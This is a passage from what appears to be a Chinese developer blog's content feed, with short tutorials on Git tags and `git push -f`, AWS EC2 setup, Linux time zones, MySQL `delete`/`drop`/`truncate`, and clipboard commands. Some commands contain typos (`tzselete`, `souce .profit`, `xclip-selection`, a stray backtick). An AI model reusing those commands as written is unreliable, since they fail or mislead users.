origin</span><br><span class="line"></span><br><span class="line"># 创建带有附注标签</span><br><span class="line">$ git tag -a v1.1.0 -m &quot;标签描述&quot;</span><br><span class="line"></span><br><span class="line"># 查看本地tag信息</span><br><span class="line">$ git show [tag]</span><br><span class="line"></span><br><span class="line"># 提交指定tag</span><br><span class="line">$ git push [remote] [tag]</span><br><span class="line"></span><br><span class="line"># 提交所有tag</span><br><span class="line">$ git push [remote] --tags</span><br><span class="line"></span><br><span class="line"># 新建一个分支，指向某个tag</span><br><span class="line">$ git checkout -b [branch] [tag]</span><br></pre></td></tr></table></figure><h3 id="Git-ProTips"><a href="#Git-ProTips" class="headerlink" title="Git ProTips"></a>Git ProTips</h3><p><code>Git ProTips</code> 则是整理的一些Git 的奇技淫巧。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 通过使用别名，优化 git log 输出，这里另外提供几种模式, 可以选择喜欢的一种进行别名配置</span><br><span class="line">$ git config --global alias.lg &quot;log --graph --pretty&#x3D;format:&#39;%Cred%h - %Cgreen[%an]%Creset -%C(yellow)%d%Creset %s %C(yellow)&lt;%cr&gt;%Creset&#39; --abbrev-commit --date&#x3D;relative&quot;</span><br><span class="line"></span><br><span class="line">$ git config --global alias.his &quot;log --graph --decorate --oneline --pretty&#x3D;format:&#39;%Creset %s %C(magenta)in %Cred%h %C(magenta)commited by %Cgreen%cn %C(magenta)on %C(yellow) %cd %C(magenta)from %Creset %C(yellow)%d&#39; --abbrev-commit --date&#x3D;format:&#39;%Y-%m-%d %H:%M:%S&#39;&quot;</span><br><span class="line"></span><br><span class="line">$ git config --global alias.hist &quot;log --graph --decorate --oneline --pretty&#x3D;format:&#39;%Cred%h - %C(bold white) %s %Creset %C(yellow)%d  %C(cyan) &lt;%cd&gt; %Creset %Cgreen(%cn)&#39; --abbrev-commit --date&#x3D;format:&#39;%Y-%m-%d %H:%M:%S&#39;&quot;</span><br><span class="line"></span><br><span class="line">$ git config --global alias.lg &quot;log --color --graph --pretty&#x3D;format:&#39;%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)&lt;%an&gt;%Creset&#39; --abbrev-commit&quot;</span><br><span class="line"></span><br><span class="line">$ git config --global alias.lg &quot;log --pretty&#x3D;format:&#39;%h - %an, %ar : %s&#39; &quot;</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://github.com/xjh22222228/git-manual" target="_blank" rel="noopener">Git 常用命令整理</a></li><li><a href="https://www.ruanyifeng.com/blog/2015/12/git-cheat-sheet.html" target="_blank" rel="noopener">常用Git 命令清单</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>手把手教你如何创建启动 AWS 实例</title>
      <link href="/teach-you-how-to-start-an-aws-instance/"/>
      <url>/teach-you-how-to-start-an-aws-instance/</url>
      
        <content type="html"><![CDATA[<blockquote><p>什么是AWS ？</p></blockquote><p><a href="https://aws.amazon.com/cn/?nc2=h_lg" target="_blank" rel="noopener">Amazon Web Services </a>(AWS) 是亚马逊提供的全球最全面、应用最广泛的云平台。</p><a id="more"></a><p>云这个概念最开始是从国内的阿里云、腾讯云这些地方听到的，后来服务器接触的多了，也慢慢了解了一些国外的云，如：亚马逊云、微软云。</p><p>在亚马逊云、软微云上创建一台实例其实是非常简单的事情，但由于这方面资料比较少，导致对于新用户可能不那么友好，我自己当初创建时就不怎么顺利。所以整理这篇笔记的目的有两个，一是方便自己日后回顾，二是给第一次使用的用户一些参考。</p><h2 id="启动实例"><a href="#启动实例" class="headerlink" title="启动实例"></a>启动实例</h2><p>首先登入到AWS ，找到<a href="https://console.aws.amazon.com/ec2/v2/home" target="_blank" rel="noopener">EC2</a> 并点击</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200810115939.png" alt="AWS"></p><p>在左侧菜单栏中点击实例</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200810121213.png" alt=""></p><p>点击启动实例</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200810121240.png" alt=""></p><h2 id="配置实例"><a href="#配置实例" class="headerlink" title="配置实例"></a>配置实例</h2><p>选择系统映像，这里以Linux 操作系统为例，我选择是<code>Ubuntu Server 18.04 LTS</code>，这个版本表示Ubuntu 服务端 长期稳定支持版本。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200810121309.png" alt=""></p><p>选择实例类型，根据自身需要考虑，当然 性能越好价格越高。这里我选择的是一个中等偏下的类型。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200810134659.png" alt=""></p><p>配置实例详情信息，这里的这些核心配置，通常都保持默认，只是将自动分配公有IP 地址改为禁用。这样再重启机器时，就不会改变IP了。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200810134802.png" alt=""></p><p>根据自身需要分配合适的硬盘大小。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200810134833.png" alt=""></p><p>配置安全组，所谓安全组就是拥有相同防火墙规则的群组。这个也是根据自身需要选择是否共用同一个安全组。</p><p>拥有同一个安全组就表示拥有相同的防火墙规则。设置完安全组之后，点击审核和启动。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200810134858.png" alt=""></p><p>下面会有一个界面给你确认机器的配置是否无误的，从头到尾检查没有问题之后就可以点击启动实例了。</p><h2 id="创建密钥"><a href="#创建密钥" class="headerlink" title="创建密钥"></a>创建密钥</h2><p>可以选择共用已有的密钥对也可以选择新建一个。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200810134919.png" alt=""></p><p>然后点击启动实例。</p><h2 id="分配弹性IP"><a href="#分配弹性IP" class="headerlink" title="分配弹性IP"></a>分配弹性IP</h2><p>启动完成之后点击查看实例。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200810134956.png" alt=""></p><p>在实例列表中，找到该实例之后，分别点击操作=&gt;联网=&gt;管理IP 地址=&gt;分配弹性 IP</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200810135020.png" alt=""></p><p>确认分配</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200810135056.png" alt=""></p><p>分配成功之后，会得到一个弹性IP（公有），然后返回实例列表</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200810135121.png" alt=""></p><h2 id="关联IP-地址"><a href="#关联IP-地址" class="headerlink" title="关联IP 地址"></a>关联IP 地址</h2><p>找到刚才启动的那个实例（没有实例ID），分别点击操作=&gt;关联地址</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200810135143.png" alt=""></p><p>这一步很重要，这里要将实例和弹性IP 地址关联，所以要选择该弹性IP 对应自己的实例。如果不确定是哪一个，可以返回到实例列表中去查看，就是那个没有名称的实例。</p><p>然后点击关联</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200810135205.png" alt=""></p><p>关联成功</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200810135233.png" alt=""></p><p>直到做完这一步才算正真的启动好一个实例。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200810135302.png" alt=""></p><h3 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h3><p>启动好实例之后，如何连接呢？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -i &lt;私钥路径&gt; ubuntu@ipaddress</span><br></pre></td></tr></table></figure><p>指定刚才生成的密钥对，使用ssh命令 即可连接。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> Tutorial </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tutorial </tag>
            
            <tag> Linux </tag>
            
            <tag> 云 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何修改 Linux 默认时区</title>
      <link href="/how-to-modify-the-linux-default-time-zone/"/>
      <url>/how-to-modify-the-linux-default-time-zone/</url>
      
        <content type="html"><![CDATA[<p>在上一篇笔记中，我们知道了如何在Linux 中查看系统默认时区，这篇笔记来学习以下如何修改默认时区。</p><a id="more"></a><p>在Linux 服务器或系统上保持正确的时间始终是一个好习惯，它可能具有以下优点：</p><ul><li>由于Linux 中的大多数任务都是按时间控制的，因此可以保持系统任务的及时运行。</li><li>在系统上记录事件和其他信息的正确时间等等。</li></ul><p>在Linux 中设置时区，有几种方式。</p><h3 id="0x1-使用tzselete-命令"><a href="#0x1-使用tzselete-命令" class="headerlink" title="0x1. 使用tzselete 命令"></a>0x1. 使用tzselete 命令</h3><ol><li>使用<code>tzselete</code> 命令选择所在时区。</li><li>将时区所在的配置文件<code>TZ=&#39;Asia/Shanghai&#39;; export TZ</code> 添加到<code>~/.profile</code>文件。</li><li>使用<code>source ~/.profire</code>命令，使时区设置生效。</li></ol><h3 id="0x2-使用timedatectl-命令"><a href="#0x2-使用timedatectl-命令" class="headerlink" title="0x2. 使用timedatectl 命令"></a>0x2. 使用timedatectl 命令</h3><p>Ubuntu 系统提供了<code>timedatectl</code> 命令，非常方便的供我们查看设置Linux 系统时区。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ timedatectl set-timezone &quot;Asia&#x2F;ShangHai&quot;</span><br></pre></td></tr></table></figure><p>如果你忘记了你想要的时区叫什么名字，那么可以使用下面的命令查看所有可用时区：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ timedatectl list-timezones</span><br></pre></td></tr></table></figure><p>因为 Linux 的时间分为两种：</p><ol><li>硬件时间：由 BIOS（或CMOS）所负责。</li><li>系统时间：由 Linux 所负责，系统时间在系统开关机后读取硬件时间后，再由 Linux 管理时间。</li></ol><h3 id="0x3-设置硬件时间"><a href="#0x3-设置硬件时间" class="headerlink" title="0x3. 设置硬件时间"></a>0x3. 设置硬件时间</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cd &#x2F;etc&#x2F; &amp;&amp; ls -al | grep localtime</span><br><span class="line">lrwxrwxrwx  1 root root         27 Jul 24 00:57 localtime -&gt; &#x2F;usr&#x2F;share&#x2F;zoneinfo&#x2F;Etc&#x2F;UTC</span><br></pre></td></tr></table></figure><p>可以看到默认链接的是<code>UTC</code>，所以需要手动更改链接时区文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ln -sf &#x2F;usr&#x2F;share&#x2F;zoneinfo&#x2F;Asia&#x2F;Shanghai &#x2F;etc&#x2F;localtime</span><br></pre></td></tr></table></figure><p>查看硬件时间</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hwclock -r</span><br></pre></td></tr></table></figure><p>将系统时间改为硬件时间</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hwclock --hctosys</span><br></pre></td></tr></table></figure><p>需要想清楚的是，时间戳本身是永远不变的，无论在哪个时区同一时刻所生成的时间戳一定是一样的。</p><p>会发生变化的只有时区，而时间戳则是根据时区的不同而解析出来的时间不同。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.tecmint.com/set-time-timezone-and-synchronize-time-using-timedatectl-command/" target="_blank" rel="noopener">How to Set Time, Timezone and Synchronize System Clock Using timedatectl Command</a></li><li><a href="https://www.cnblogs.com/kerrycode/p/4217995.html" target="_blank" rel="noopener">Linux 查看设置系统时区</a></li><li><a href="https://david50.pixnet.net/blog/post/45228135-%5B%E7%AD%86%E8%A8%98%5Dlinux%E6%99%82%E9%96%93%E5%8F%8A%E6%99%82%E5%8D%80" target="_blank" rel="noopener">Linux 时间以及时区</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql 删除数据及数据表</title>
      <link href="/mysql-delete-data-and-data-table/"/>
      <url>/mysql-delete-data-and-data-table/</url>
      
        <content type="html"><![CDATA[<p>在Mysql 中删除数据以及数据表非常的容易，但是需要特别小心，因为一旦删除所有数据都会消失。</p><a id="more"></a><h2 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h2><p>删除表内数据，使用<code>delete</code>关键字。</p><h3 id="删除指定条件的数据"><a href="#删除指定条件的数据" class="headerlink" title="删除指定条件的数据"></a>删除指定条件的数据</h3><p>删除用户表内id 为1 的用户：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete from User where id &#x3D; 1;</span><br></pre></td></tr></table></figure><h3 id="删除表内所有数据"><a href="#删除表内所有数据" class="headerlink" title="删除表内所有数据"></a>删除表内所有数据</h3><p>删除表中的全部数据，表结构不变。</p><p>对于 MyISAM 会立刻释放磁盘空间，InnoDB 不会释放磁盘空间。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete from User;</span><br></pre></td></tr></table></figure><p>释放磁盘空间</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">optimize table User;</span><br></pre></td></tr></table></figure><h3 id="删除数据表"><a href="#删除数据表" class="headerlink" title="删除数据表"></a>删除数据表</h3><p>删除数据表分为两种方式：</p><ol><li>删除数据表内数据以及表结构</li><li>只删除表内数据，保留表结构</li></ol><h4 id="drop"><a href="#drop" class="headerlink" title="drop"></a>drop</h4><p>使用<code>drop</code>关键词会删除整张表，啥都没有了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop table User;</span><br></pre></td></tr></table></figure><h4 id="truncate"><a href="#truncate" class="headerlink" title="truncate"></a>truncate</h4><p><code>truncate</code> 关键字则只删除表内数据，会保留表结构。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">truncate table User;</span><br></pre></td></tr></table></figure><blockquote><p>思考题：如何批量删除前缀相同的表？</p></blockquote><p>想要实现 <code>drop table like &#39;wp_%&#39;</code>，没有直接可用的命令，不过可以通过Mysql 的语法来拼接。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-- 删除”wp_”开头的表：</span><br><span class="line">SELECT CONCAT( &#39;drop table &#39;, table_name, &#39;;&#39; ) AS statement</span><br><span class="line">FROM information_schema.tables</span><br><span class="line">WHERE table_schema &#x3D; &#39;database_name&#39; AND table_name LIKE &#39;wp_%&#39;;</span><br></pre></td></tr></table></figure><p>其中<code>database_name</code>换成数据库的名称，<code>wp_</code>换成需要批量删除的表前缀。</p><blockquote><p>注意只有<code>drop</code>命令才能这样用：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop table if exists tablename&#96;;</span><br></pre></td></tr></table></figure><blockquote><p><code>truncate</code>只能这样使用：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">truncate table &#96;tp_trade&#96;.&#96;setids&#96;;</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li><p>当你不再需要该表时， 用<code>drop</code>;</p></li><li><p>当你仍要保留该表，但要删除所有记录时， 用<code>truncate</code>;</p></li><li><p>当你要删除部分记录时， 用<code>delete</code>。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git Push -f 命令详解</title>
      <link href="/detailed-explanation-of-git-push-f-command/"/>
      <url>/detailed-explanation-of-git-push-f-command/</url>
      
        <content type="html"><![CDATA[<p>最近遇到了一个Git Push 相关的问题，同事不小心把一些错误代码提交到仓库了。<br>如果每个人直接更新的话，会导致错误代码也更新到本地了。</p><p>这个时候想要避免这种情况的发生，唯一可以做的就是将那些错误代码直接覆盖掉。</p><a id="more"></a><h2 id="git-push-f"><a href="#git-push-f" class="headerlink" title="git push -f"></a>git push -f</h2><p><code>git push -f</code> 这个命令的作用是将自己本地仓库的代码直接推送至仓库，完全以你的提交为准，之前其他人的提交都会被覆盖。</p><p>那么这么可怕的命令，究竟在什么情况下才适用呢？</p><h3 id="使用时机"><a href="#使用时机" class="headerlink" title="使用时机"></a>使用时机</h3><p>有两种情况下适合使用这个命令：</p><ol><li>确定需要覆覆盖提交，就像上面的那种情况，在明确部分提交会导致异常时，可以使用新的提交去覆盖。</li><li>需要整理历史提交记录时，有时候项目的 Commit Logs 可能比较乱，不能清晰的看出每一次提交的作用，可以使用 <code>rebase</code> 命令来清理历史提交记录。因为改变了历史，所以正常来说是 <code>push</code>不成功的，所以需要使用 <code>force push</code>来解决这个问题。</li></ol><h3 id="默认分支保护"><a href="#默认分支保护" class="headerlink" title="默认分支保护"></a>默认分支保护</h3><p>因为可能会出现不小心使用的情况，<code>Github</code>、<code>Gitlab</code>这类源码托管网站会提供分支保护机制。可以避免某个分支被 <code>force push</code>，默认是 <code>master</code>为保护分支。</p><p>这里以<code>Gitlab</code>为例，<code>设置-&gt;仓库-&gt;Protected Branches</code>：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200805144123.png" alt=""></p><p>所以如果想强制提交，前提需要取消对该分支的保护。</p><blockquote><p>万一自己的代码被覆盖掉了，还救得回来吗？</p></blockquote><p>其实也是有办法的，那就是换你或是其它有之前提交的同事，再次进行 <code>git push -f</code>，将正确的内容强制提交上去，覆盖上一次<code>git push -f</code>所造成的灾难。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://gitbook.tw/chapters/github/using-force-push.html" target="_blank" rel="noopener">聽說 git push -f 這個指令很可怕，什麼情況可以使用它呢？</a></p>]]></content>
      
      
      <categories>
          
          <category> Git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows/Mac/Linux 如何将内容输出到剪贴板</title>
      <link href="/how-to-output-content-to-clipboard-on-windows-mac-linux/"/>
      <url>/how-to-output-content-to-clipboard-on-windows-mac-linux/</url>
      
        <content type="html"><![CDATA[<p>如何将输出直接复制至剪切板？在不同的系统中，所使用的命令是不同的。</p><a id="more"></a><h3 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 将输出复制至剪贴板</span><br><span class="line">$ echo &quot;hello mac&quot; | pbcopy</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 将文件中的内容全部复制至剪贴板</span><br><span class="line">$ pbcopy &lt; remade.md</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 将剪切板中的内容粘贴至文件</span><br><span class="line">$ pbpaste &gt; remade.md</span><br></pre></td></tr></table></figure><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p>Linux 用户需要先安装 <code>xclip</code>，它建立了终端和剪切板之间的通道。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 查看剪切板中的内容</span><br><span class="line">$ xclip -o</span><br><span class="line">$ xclip -selection c -o</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 将输出复制至剪贴板</span><br><span class="line">$ echo &quot;hello xclip&quot; | xclip-selection c</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 将文件中的内容全部复制至剪贴板</span><br><span class="line">$ xclip -selection c remade.md</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 将剪切板中的内容粘贴至文件</span><br><span class="line">$ xclip -selection c -o &gt; remade.md</span><br></pre></td></tr></table></figure><p>或者直接使用<code>xsel</code>命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 将输出复制至剪贴板</span><br><span class="line">$ echo &quot;hello linux&quot; | xsel</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 将文件中的内容全部复制至剪贴板</span><br><span class="line">$ xsel &lt; remade.md</span><br></pre></td></tr></table></figure><p>需要注意的是：xsel、xclip 命令是在 X 环境下使用的，所以远程连接服务器时使用会报异常：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xclip error can&#39;t open display (null)</span><br></pre></td></tr></table></figure><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 将输出复制至剪贴板</span><br><span class="line">$ echo &quot;hello windows&quot; | clip</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 将文件中的内容全部复制至剪贴板</span><br><span class="line">$ clip &lt; remade.txt</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Shell </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Shell </tag>
            
            <tag> Windows </tag>
            
            <tag> Mac </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何查看 Linux 默认时区</title>
      <link href="/how-to-check-the-linux-default-time-zone/"/>
      <url>/how-to-check-the-linux-default-time-zone/</url>
      
        <content type="html"><![CDATA[<p>最近遇到一个跟服务器时区相关的问题，没准备充分，当问题真正来临时，很懵。</p><p>特别是在生产环境中，系统时区是特别重要的存在，很多应用在默认情况下，都是取的系统时区，如果时区处理不得当的话，可能会造成不必要的困扰。</p><a id="more"></a><h1 id="时区的概念"><a href="#时区的概念" class="headerlink" title="时区的概念"></a>时区的概念</h1><p>关于时区，有以下几个标准：</p><ul><li>CST：北美中部标准时间</li><li>UTC：协调世界时，又称世界标准时间，简称UTC，从英文国际时间/法文协调时间”Universal Time/Temps Cordonné”而来。中国大陆、香港、澳门、台湾、蒙古国、新加坡、马来西亚、菲律宾、澳洲西部的时间与UTC的时差均为+8，也就是UTC+8。</li><li>GMT：格林尼治标准时间（旧译格林威治平均时间或格林威治标准时间；英语：Greenwich Mean Time，GMT）是指位于英国伦敦郊区的皇家格林尼治天文台的标准时间，因为本初子午线被定义在通过那里的经线。</li></ul><p>Linux 的时间分为两种：</p><ol><li>硬件时间：由 BIOS（或CMOS）所负责。</li><li>系统时间：由 Linux 所负责，系统时间在系统开关机后读取硬件时间后，再由 Linux 管理时间。</li></ol><h2 id="date"><a href="#date" class="headerlink" title="date"></a>date</h2><p>date命令是显示或设置系统时间与日期。</p><p>这个是最简单、最直观获取系统时间与日期的方式了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ date</span><br><span class="line">Thu Jul 30 13:23:50 CST 2020</span><br></pre></td></tr></table></figure><p>显示所在时区：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">date +&quot;%Z %z&quot;</span><br><span class="line">CST +0800</span><br></pre></td></tr></table></figure><blockquote><p>注意 <code>+</code> 和 <code>&quot;</code>之间没有空格，否则会报表。</p></blockquote><p>date 命令常见参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">%H 小时，24小时制（00~23）</span><br><span class="line">%I 小时，12小时制（01~12）</span><br><span class="line">%k 小时，24小时制（0~23）</span><br><span class="line">%l 小时，12小时制（1~12）</span><br><span class="line">%M 分钟（00~59）</span><br><span class="line">%p 显示出AM或PM</span><br><span class="line">%r 显示时间，12小时制（hh:mm:ss %p）</span><br><span class="line">%s 从1970年1月1日00:00:00到目前经历的秒数</span><br><span class="line">%S 显示秒（00~59）</span><br><span class="line">%T 显示时间，24小时制（hh:mm:ss）</span><br><span class="line">%X 显示时间的格式（%H:%M:%S）</span><br><span class="line">%Z 以字符串的形式显示时区，日期域（CST）</span><br><span class="line">%z 以数字的形式显示时区 (+0800)</span><br><span class="line">%a 星期的简称（Sun~Sat）</span><br><span class="line">%A 星期的全称（Sunday~Saturday）</span><br><span class="line">%h,%b 月的简称（Jan~Dec）</span><br><span class="line">%B 月的全称（January~December）</span><br><span class="line">%c 日期和时间（Tue Nov 20 14:12:58 2012）</span><br><span class="line">%d 一个月的第几天（01~31）</span><br><span class="line">%x,%D 日期（mm&#x2F;dd&#x2F;yy）</span><br><span class="line">%j 一年的第几天（001~366）</span><br><span class="line">%m 月份（01~12）</span><br><span class="line">%w 一个星期的第几天（0代表星期天）</span><br><span class="line">%W 一年的第几个星期（00~53，星期一为第一天）</span><br><span class="line">%y 年的最后两个数字（1999则是99）</span><br></pre></td></tr></table></figure><h2 id="timedatectl"><a href="#timedatectl" class="headerlink" title="timedatectl"></a>timedatectl</h2><p>timedatectl 命令非常的方便，当你不带任何参数运行它时，这条命令可以像下图一样，输出系统时间概览，其中包含当前时区：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ timedatectl</span><br><span class="line"></span><br><span class="line">Local time: Thu 2020-07-30 05:30:21 UTC</span><br><span class="line">                  Universal time: Thu 2020-07-30 05:30:21 UTC</span><br><span class="line">                        RTC time: Thu 2020-07-30 05:30:21</span><br><span class="line">                       Time zone: Etc&#x2F;UTC (UTC, +0000)</span><br><span class="line">       System clock synchronized: yes</span><br><span class="line">systemd-timesyncd.service active: yes</span><br><span class="line">                 RTC in local TZ: no</span><br></pre></td></tr></table></figure><p>只查看时区：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ timedatectl | grep &quot;Time zone&quot;</span><br></pre></td></tr></table></figure><h2 id="etc-timezone"><a href="#etc-timezone" class="headerlink" title="/etc/timezone"></a>/etc/timezone</h2><p>使用 cat 命令显示文件 <code>/etc/timezone</code> 的内容，来查看时区：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat &#x2F;etc&#x2F;timezone</span><br><span class="line">Etc&#x2F;UTC</span><br></pre></td></tr></table></figure><p>选择时区</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ tzselect</span><br></pre></td></tr></table></figure><p>选择完成之后，将时区相关的配置，写入<code>.profit</code>配置文件中。</p><p>然后使用 souce 命令，强制生效。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">souce .profit</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://linux.cn/article-7970-1.html" target="_blank" rel="noopener">在 Linux 中查看时区</a></li><li><a href="https://man.linuxde.net/date" target="_blank" rel="noopener">Linux date 命令</a></li><li><a href="https://24timezones.com/map_zh.php#/map" target="_blank" 